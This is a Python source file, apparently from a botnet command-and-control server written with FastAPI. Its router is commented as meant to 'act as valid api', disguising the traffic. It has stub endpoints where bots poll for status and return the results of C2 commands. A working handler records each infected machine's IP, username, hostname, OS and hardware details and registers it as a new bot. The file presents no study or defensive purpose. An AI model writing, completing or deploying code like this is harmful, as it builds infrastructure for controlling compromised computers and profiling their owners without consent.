from fastapi import Request, APIRouter, status
from config import SystemDetails
from database.bot import create_new_bot

router = APIRouter(prefix="/api/v1") # act as valid api

# bot send its status (polling)
@router.post("/status/{token}")
async def report_status(request: Request, token: str):
    pass

# bot send result of command from c2 server
@router.post("/result/{token}")
async def report_result(request: Request, token: str):
    pass

@router.post("/sysinfo/{token}", status_code=status.HTTP_204_NO_CONTENT)
async def receive_sysinfo(request: Request, token: str, details: SystemDetails):
    # details_dict = details.dict()
    ip = request.client.host
    details_dict = details.dict()
    # Unpack the values directly from the dictionary
    username = details_dict['username']
    hostname = details_dict['hostname']
    os = details_dict['os']
    cpu = details_dict['cpu']
    gpu = details_dict['gpu']
    ram = details_dict['ram']
    disk = details_dict['disk']

    if (create_new_bot(token, username, hostname, ip, os, cpu, gpu, ram, disk)):
        print("create new bot success!")
    else:
        print("create new bot fail!")